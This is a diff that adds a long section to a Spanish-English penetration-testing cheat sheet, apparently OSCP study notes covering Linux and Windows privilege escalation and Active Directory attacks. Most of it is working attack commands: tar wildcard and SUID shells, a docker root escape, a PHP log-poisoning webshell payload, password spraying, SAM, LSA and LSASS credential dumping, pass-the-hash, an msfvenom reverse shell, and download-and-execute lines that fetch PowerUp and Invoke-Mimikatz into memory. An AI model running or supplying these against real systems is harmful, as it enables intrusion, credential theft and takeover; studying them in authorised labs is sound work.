@@ -4617,6 +4617,665 @@ uv tool install sqlmap-websocket-proxy
 python3 -m pip install sqlmap-websocket-proxy
 ```
 
+## Priv Escalation  ARENA
+
+----------------------------------------------------------------------------
+
+C:\> whoami /priv
+
+Privilege Name              Description                          State
+SeDebugPrivilege            Debug programs                       Enabled
+SeChangeNotifyPrivilege     Bypass traverse checking             Enabled
+SeUndockPrivilege           Remove computer from docking station Disabled
+
+
+Read and write the memory of any process including LSASS - Mimikatz sekurlsa::logonpasswords or Task Manager create dump will work with this privilege. No SYSTEM needed”
+
+---------------------------------------------------------------------
+
+
+user@target:/$ cat /etc/crontab
+*/5 * * * * root cd /var/backups && tar czf backup.tgz *
+
+user@target:/$ ls -la /var/backups/
+drwxrwxrwx 2 root root 4096 Apr 10 /var/backups/
+
+✅ “Create files named --checkpoint=1 and --checkpoint-action=exec=sh privesc.sh in /var/backups along with a privesc.sh payload - tar interprets filenames starting with -- as flags”
+
+
+-------------------------------------------------------------------------
+
+user@target:/$ find / -perm -u=s -type f 2>/dev/null
+
+/usr/bin/find
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/sbin/exim4
+/usr/bin/newgrp
+
+find . -exec /bin/sh -p \; -quit # Ejecuta comandos
+
+-------------------------------------------
+
+# Login endpoint code (read via LFI):
+if ($_POST['password'] == $stored_hash) {
+    login_success();
+}
+# stored_hash = "0e462097431906509019562988736854"
+
+root@kali:~# curl -d "username=admin&password=0e830400451993494058024219903391" http://10.10.x.x/login.php
+Welcome admin!
+
+Both strings start with 0e and contain only digits - PHP's loose comparison (==) treats strings matching /^0+e\d+$/ as scientific notation floats equal to 0, so any two such strings compare as equal regardless of their actual content
+
+
+Explanation
+
+PHP magic hashes: strings matching 0e[0-9]+ are interpreted as 0 * 10^n = 0 when compared with ==. The stored hash 0e462097... == 0, and your payload 0e830400... == 0, so they're equal. Use === (strict comparison) to fix this. Many MD5 hashes of common strings start with 0e - these are collected in public magic hash tables. This only works with == not ===, and only when both values match the 0e pattern.
+
+
+--------------------------------------------------------------------
+
+
+user@target:/$ id
+uid=1001(user) gid=1001(user) groups=1001(user),999(docker)
+
+user@target:/$ docker images
+REPOSITORY   TAG      IMAGE ID
+alpine       latest   a24bb4013296
+
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+--------------------------------------------------------------------
+
+bloodhound query result:
+Node: svc_web (User)
+Edge: ReadGMSAPassword
+Target: GMSA_SVC$ (Managed Service Account)
+
+GMSA_SVC$ Outbound:
+  GenericAll -> TARGET_SERVER$
+
+
+  Read the GMSA password as svc_web, authenticate as GMSA_SVC$, then abuse GenericAll on TARGET_SERVER$ to add yourself to local admins or perform a resource-based constrained delegation attack
+
+
+  --------------------------------------------------------------------------------
+
+
+www-data@ubuntu:/var/www/html$ sudo -l
+
+User www-data may run the following commands on ubuntu:
+    (root) NOPASSWD: /usr/bin/fail2ban-client
+
+www-data@ubuntu:/var/www/html$ cat /etc/passwd | grep -v nologin | grep -v false
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/bin/sh
+michael:x:1001:1001:,,,:/home/michael:/bin/bash
+steven:x:1002:1002:,,,:/home/steven:/bin/bash
+
+
+  Set the actionban command for a jail to chmod u+s /bin/bash, then trigger the ban with banip to execute it as root
+
+
+🔥 Abuso
+Modificas la acción:
+fail2ban-client set <jail> actionban "chmod u+s /bin/bash"
+Disparas el ban:
+fail2ban-client set <jail> banip 1.2.3.4
+
+👉 Eso ejecuta el comando como root
+
+-----------------------------------------------------------------------------------
+
+www-data@dmz:/$ cat /etc/ssh/sshd_config | grep -i "GatewayPorts|AllowTcpForward"
+GatewayPorts yes
+AllowTcpForwarding yes
+
+www-data@dmz:/$ ssh -R 0.0.0.0:8888:192.168.internal.10:80 attacker@10.8.0.1
+
+
+Port 8888 on the DMZ host binds on all interfaces - anyone who can reach the DMZ on port 8888 gets forwarded to 192.168.internal.10:80, not just connections from Kali
+
+
+SSH -R creates a listener on the remote (SSH server) side. With GatewayPorts yes, 0.0.0.0:8888 means the DMZ host listens on 8888 on all network interfaces. Any host that can reach the DMZ - including external networks - can connect to DMZ:8888 and reach the internal service. Without GatewayPorts or with just 8888:, it would bind to 127.0.0.1 only. This turns the DMZ into a pivot accessible from the outside.
+
+-----------------------------------------------------------------
+
+C:\Users\bob> cmdkey /list
+
+Currently stored credentials:
+
+    Target: Domain:interactive=WORKGROUP\Administrator
+    Type: Domain Password
+    User: WORKGROUP\Administrator
+
+
+runas /user:Administrator /savecred cmd.exe
+
+
+---------------------------------------------------------------------
+
+
+edward@debian:~$ ss -tlnp
+
+Netid  State  Local Address:Port
+tcp    LISTEN 127.0.0.1:25         0.0.0.0:*
+tcp    LISTEN 127.0.0.1:9000       0.0.0.0:*
+tcp    LISTEN 0.0.0.0:3306         0.0.0.0:*
+tcp    LISTEN 0.0.0.0:22           0.0.0.0:*
+tcp    LISTEN :::80                :::*
+
+edward@debian:~$ nc -v 127.0.0.1 9000
+Connection to 127.0.0.1 9000 succeeded!
+
+
+1. Nginx / Apache recibe la petición (puerto 80)
+2. Ve que es un archivo .php
+3. Se lo manda a PHP-FPM (puerto 9000)
+4. PHP-FPM ejecuta el código
+5. Regresa el resultado al navegador
+
+---------------------------------------------------------------------
+
+vsftpd 2.3.4 has a deliberate backdoor (CVE-2011-2523) 
+
+----------------------------------------------------------------------
+
+
+
+root@kali:~# curl "http://10.10.x.x/view.php?file=../../../etc/passwd"
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:...
+
+root@kali:~# curl "http://10.10.x.x/view.php?file=../../../var/log/apache2/access.log"
+127.0.0.1 - - [12/Apr/2026:10:23:01] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0"
+10.8.0.1  - - [12/Apr/2026:10:23:45] "GET /view.php HTTP/1.1" 200 891 "-" "Mozilla/5.0"
+
+
+Log poisoning: send a request with a PHP payload in the User-Agent header - curl -A "<?php system($_GET['cmd']); ?>" http://10.10.x.x/. The PHP string lands in the access log. Then trigger it: curl "http://10.10.x.x/view.php?file=../../../var/log/apache2/access.log&cmd=id". You already confirmed the log is readable. Apache writes to it as the web service user who also owns the log. No need to pre-check permissions.
+
+
+--------------------------------------------------------------------------------------
+
+## Auto Login 
+
+
+C:\> reg query HKLM /f "password" /t REG_SZ /s 2>nul
+
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+  DefaultUserName    REG_SZ  Administrator
+  DefaultPassword    REG_SZ  P@ssw0rd2023!
+  AutoAdminLogon     REG_SZ  1
+
+HKLM\SOFTWARE\OracleDB\Config
+  dbpassword    REG_SZ  OracleSecret99
+
+
+----------------------------------------------------------------------------------
+
+root@kali ~/Forest
+# netexec ldap $target -u 'users2' -p '' --asreproast asrep.txt
+
+LDAP  10.129.142.24  389  FOREST  [*] Windows Server 2016 Build 14393 (FOREST.htb.local)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED (Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED (Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED (Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED (Clients credentials have been revoked)
+
+
+KDC_ERR_CLIENT_REVOKED means the account exists but is disabled, expired, or explicitly revoked - not rate limited. Rate limiting would time out or drop packets. Clock skew causes KRB_AP_ERR_SKEW. Missing TGT would produce a different auth flow error. The fix: re-enumerate usernames via netexec smb --rid-brute, confirm which accounts are enabled, then re-run ASREPRoast against only those.
+
+-------------------------------------------------------------------------------------------------
+
+root@kali ~/Forest
+# netexec smb $target -u "" -p "" --shares
+
+SMB  FOREST  Share     Permissions  Remark
+SMB  FOREST  ADMIN$                 Remote Admin
+SMB  FOREST  C$                     Default share
+SMB  FOREST  IPC$      READ         Remote IPC
+SMB  FOREST  NETLOGON               Logon server share
+SMB  FOREST  SYSVOL                 Logon server share
+
+
+IPC$ READ with null auth is the standard entry point for domain user enumeration. It exposes RPC named pipes - enough to run rpcclient -U "" target -N then enumdomusers, or netexec smb target --rid-brute. Blank permissions on the other shares means you simply don't have access to them, not that they're broken. Those usernames feed directly into ASREPRoasting and password spraying.
+
+
+-------------------------------------------------------------------------------------------------------------
+
+C:\> icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+C:\ProgramData\...\Startup  BUILTIN\Users:(F)
+                               NT AUTHORITY\SYSTEM:(F)
+
+C:\> whoami
+corp\lowpriv
+
+C:\> query user
+ USERNAME    SESSIONNAME  STATE
+ admin       console      Active
+
+
+
+ Startup folder items run when a user logs in, not when files are added. Admin is already active - your payload fires on their next login (reboot, logoff/logon). For immediate execution against the active session, look for other vectors: writable scheduled tasks, service binaries, or DLL hijacking in processes they are running. Startup folder is useful for persistence but not immediate code execution against a live session.
+
+
+ ----------------------------------------------------------------------------------------
+
+ c:\windows\system32\inetsrv> whoami
+nt authority\local service
+
+c:\windows\system32\inetsrv> whoami /priv
+
+Privilege Name                Description                    State
+SeAssignPrimaryTokenPrivilege Replace a process level token  Disabled
+SeImpersonatePrivilege        Impersonate a client           Enabled
+
+
+SeImpersonatePrivilege is the classic potato path. The exploit creates a COM server, tricks a privileged process into authenticating to it, then impersonates the captured SYSTEM token. PrintSpoofer works on Server 2019 and Windows 10. GodPotato is the most universal. Transfer the binary through the same SMB share you used for the webshell. No active admin session needed - the exploit creates its own trigger.
+
+-------------------------------------------------------------------
+
+user@target:/$ find / -perm -u=s -type f 2>/dev/null | grep -v snap
+/usr/local/bin/sysmon
+
+user@target:/$ strings /usr/local/bin/sysmon | grep -v "^/"
+service
+ps aux
+curl
+network_check
+libc.so.6
+
+
+PATH hijacking: create a fake ps (or curl, service) in a directory you control, prepend it to PATH, run the SUID binary. It finds your binary first. The SUID euid of root means the child process spawned by your script also runs as root. No need to strace first - try ps since it's called first in the strings output. CWD is not searched before PATH on modern Linux unless the binary explicitly adds . to PATH.
+
+-----------------------------------------------------------------
+
+## Descubrir redes barridos de pings
+
+
+
+Usa esta otra herramienta para descubrir redes.
+
+
+```
+fping -qag 192.168.98.0/24 | tee ips
+```
+
+Agrega todas las ips de los dominios que tengas a el /etc/hosts. Para examenes como el OSCP que son varias maquinas usaron. Obtienes un password lo checas contra todas las ips y servicios winrm, smb, rdp e incluso ve si eres usuario local de alguna maquina password spray asi se manejan estas.
+
+```
+ netexec smb 10.10.10.14/24
+ netexec smb ips
+
+```
+
+Desde netexec puedes lanzar el bloodhound
+
+```
+netexec ldap 10.0.2.4 -u 'test1user' -p 'testpass' --bloodhound --collection All --dns-server 10.0.2.4
+```
+
+Buscar mas usuarios
+
+```
+netexect ldap 10.0.2.4 -u testuser -p 'testpasswd' --users 
+```
+
+```
+netexect ldap 10.0.2.4 -u testuser -p 'testpasswd' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print $ 5}' | tee users
+```
+
+Ojo puedes leer las descripciones de los usuarios desde aqui lo cual es perfecto porque ahi alojan contraseñas
+
+
+## Password spray
+
+El pass es un archivo y tiene un solo password ( HappyCactus$10)
+
+```
+netexec smb ips -u users -p pass --continue-on-success
+```
+
+Pero ojo tambien puedes probar el password spraying para otros protocolos como el RPD
+
+```
+netexec rdp ips -u users -p pass --continue-on-success
+```
+
+Puede ser con winrm para ganar una shell ya mismo
+
+```
+netexec winrm ips -u users -p pass --continue-on-success
+```
+
+## BLoodHound
+
+Esto es oro para ti que eres muy visual. Dentro del bloodhound se pueden buscar usuarios kerberosteables o con asp-reproast.
+
+Ve a la pestaña de "CYPHER" y despues ve a las "Saved Queries" y ahi busca: All Domain Admins, Shortes paths from Owned objects, AS-REP Roastable users, Kerberoastable members of Tier Zero, Kerberoastable All, dcs ( no lo tomes tanto en cuenta). 
+
+## Comandos basicos de reconocimiento cuando llegas a un windows
+
+```
+hostname 
+
+whoami /all
+
+```
+
+### Guardar la SAM
+
+
+```
+  # El flujo que se recomienda probar es el siguiente
+
+    1. lsassy (rápido)
+    2. --lsa (persistente)
+    3. --sam (fallback)
+
+  # Administrador local o System para poder hacer esto
+  # Tambien grupos privilegeados como 
+    # Administrators, Backup Operators, System
+
+
+mkdir c:\temp
+
+reg save hklm\sam c:\temp
+
+reg save hklm\system c:\Temp\system
+
+
+   # Si estas dentro del grupo administrators puedes intentar
+
+netexec smb ips -u mat -p 'newpasswordcracked' --sam
+
+  # Se necesitan privlegios altos de nuevo como local: Administrators o que seas SYSTEM y ad no siempre funciona el Backup Operators
+  #dumpear credenciales desde LSASS remotamente
+  # Para dumpear LSASS no necesitas ser Domain Admin… solo admin en esa máquina
+
+netexec smb ips -u mat -p 'newpasswordcracked' -M lsassy
+
+  # Intenta dumpear secretos del LSA (Local Security Authority)
+  # No es exactamente memoria como LSASS, sino:💥 secrets almacenados en el sistema
+  # 💥 Privilegios de administrador local
+  # Si LSASS no da nada… LSA aún puede tener oro
+  # Pwn3d! Si ves eso eres admin local 
+
+  netexec smb ips -u mat -p 'newpasswordcracked' --lsa
+
+  # Cuando tienes ya el hash/password de un domain controler
+
+  netexec smb 10.0.2.4 -u administrator -H 'hashsntlm' -X whoami
+
+  # Y el mas potente al parecer
+
+  netexec smb 10.0.2.4 -u administrator -p 'passwd' --lsa secdump
+
+  # Existen otros 💥 dumpear LSASS (memoria) de forma más sigilosa
+  # Leer memoria de LSASS  y Extraer credenciales
+
+  netexec smb <ip> -u user -p pass -M nanodump
+``` 
+Desde evil-winrm se puede descargar!!!Entonces puedes hacer lo siguiente para descargar la sam y el system que te guardaste
+
+```
+download sam 
+download system
+```
+
+Vamos a sacar todos los hashes dentro de la sam y system
+
+```
+impacket-secretsdump -system system -sam sam local
+```
+
+Guarda todo y usa texto descriptivo por ejemplo hashes_Client-1_10.0.2.7.txt
+
+Si nos sabes que tipo de hash es o tienes duda usa john ese lo detecta solo
+
+```
+john --wordlist=rockyou.txt hashes_Client-1_10.0.2.7.txt
+  #Para lo que sacas de la sam 
+john --wordlist=rockyou.txt hashes_Client-1_10.0.2.7.txt --format=nt
+
+```
+
+Revisa si ese hashs se pudo crackear si puede loggearse contra mas maquinas no usuario maquinas
+
+```
+  # “Autentícate contra la cuenta LOCAL de la máquina, no contra el dominio”
+
+netexec winrm ips -u mat -p 'newpasswordcracked' --local-auth
+
+netexec smb ips -u mat -p 'newpasswordcracked' --local-auth
+```
+
+Una cosa que no he hecho es RPD
+
+```
+xfreerdp3 /v:10.0.2.7 /u:testuser /p:'passwordtest' /cert:ignore +clipboard /dynamic-resolution
+
+```
+
+Agregar usuarios al grupo local Administrators
+
+```
+net localgroup "administrators" testuser /add
+
+
+```
+
+## haiti
+
+Programa que te enseña cual el el hash te da el modo en HC y en John
+
+
+```
+haiti '$DCC2$10240'
+```
+
+## PSexec
+
+impacket-psexec hack-domain.local/administrator@10.0.2.4 -hashes hflsdfgsjdlfjgksdfhkgldk
+
+
+## AS-REP Roasting
+
+Para sacar hashes facilmente es algo que deberias de probar lo antes posible.
+
+ ```
+impacket-GetNPUsers -dc-ip $DC hack-academy.local/ -usersfile users
+ ```
+
+ ## PowerUp priv escalation 
+
+
+ Ya es algo viejo usa mejor WinPEAS pero aun jala puedes hacer desde powershell.
+
+ ```
+ powershell.exe -c "wget -useb https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" | iex; Invoke-AllChecks"
+
+    # Mejor bajalo a tu kali y de ahi lo pasas -useb use basic pasing
+
+ powershell.exe -c "wget -b http://pythonserver/PowerUP.ps1"   
+
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks
+
+ ```
+
+## Ver los servicios
+
+Enumeración de servicios en Windows, muy útil para privesc
+
+```
+sc.exe query wampmysqld64
+sc.exe qc wampmysqld64
+
+  # Para iniciar un servicio
+
+sc.exe start wampmysqld64
+
+  # en el ejemplo el usuario tenia permisos de reiniciar la maquina eso ayudo a que con un proceso que se AUTOSTART permitiera que elevaramos privilegios.
+
+  # Encontrar el servicio
+
+service | findstr /i wonder  
+
+```
+
+
+## icacls
+
+Eso te permite ver los permisos de los archivos
+
+🔐 Permisos principales
+| Código | Significado                      |
+| ------ | -------------------------------- |
+| **F**  | Full control (control total) 🔥  |
+| **M**  | Modify (modificar)               |
+| **RX** | Read & Execute (leer y ejecutar) |
+| **R**  | Read (leer)                      |
+| **W**  | Write (escribir)                 |
+
+🔍 Permisos más específicos (avanzado)
+| Código   | Significado                     |
+| -------- | ------------------------------- |
+| **D**    | Delete                          |
+| **RC**   | Read Control                    |
+| **WDAC** | Write DAC (cambiar permisos) 🔥 |
+| **WO**   | Write Owner                     |
+| **S**    | Synchronize                     |
+| **AS**   | Access System Security          |
+
+
+🧠 Flags adicionales
+| Flag | Significado          |
+| ---- | -------------------- |
+| (I)  | Heredado (Inherited) |
+| (OI) | Object Inherit       |
+| (CI) | Container Inherit    |
+
+## MSFVENOM
+
+msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=ip LPOR=4444 -f exe > shell.exe
+
+## USA Mimikatz.ps1 mejo usa el .exe
+
+
+Ya sabes para dumpear la sam y sacar hashes, tickets y mas. Mimikatz 👉 Trabaja en: Memoria (LSASS)
+
+```
+https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
+
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
+Invoke-Mimikatz
+
+Para usarlo usa
+. .\Invoke-Mimikatz.ps1 es igual que esto Import-Module .\PowerUp.ps1
+Invoke-Mimikatz
+
+```
+
+
+Usa este mejor.
+
+
+
+```
+Mimikatz = más potente (memoria)
+NetExec = más práctico (remoto)
+SAM dump = más básico (hashes)
+caday00 mimikatz2.1.1
+
+
+https://github.com/gentilkiwi/mimikatz/releases
+
+  # Comandos basicos
+
+privilege::debug
+
+
+```
+
+Cuando tienes que un password tiene que cambiar usa la siguietne tool
+
+```
+  # Aparece PASSWORD_MUST_CHANGE
+smbpasswd -r 10.0.2.4 -U websvc
+
+
+```
+
+## WMI
+
+Puedes ejecutar comandos mas no te regresa una shell. No es lo mismo que winrm
+
+```
+netexec wmi 10.0.0.5 -u user -p pass -x "whoami"
+```
+
+
+netexec smb ips -u websrv -p 'password123' --shares --spider Web --regex .
+
+
+Opcion mas detallada a icacls
+
+```
+
+Get-Acl C:\Temp\file.txt | fl
+
+```
+
+## ¿Qué es un Unquoted Service Path?
+
+👉 En Windows Services un servicio tiene una ruta al ejecutable:
+
+```
+
+C:\Program Files\My App\service.exe
+```
+
+Si NO está entre comillas: 👉 Windows interpreta mal la ruta
+
+
+Qué hace Windows internamente?
+
+👉 Intenta ejecutar en este orden:
+
+```
+C:\Program.exe
+C:\Program Files\My.exe
+C:\Program Files\My App\service.exe
+```
+
+💣 ¿Dónde entra el ataque?
+
+👉 Si puedes escribir en alguna de esas rutas:
+
+Ejemplo:
+
+```
+C:\Program Files\
+```
+
+
+👉 Puedes crear:
+
+```
+C:\Program.exe
+```
+
+
+🔥 Resultado
+
+Cuando el servicio se inicia: o porque reiniciaste
+
+```
+Windows ejecuta → C:\Program.exe
+```
+
 # Referencias
 
 > https://medium.com/@verylazytech/from-novice-to-ninja-how-the-oscp-cheatsheet-can-catapult-your-cyber-career-0eb446ab041d
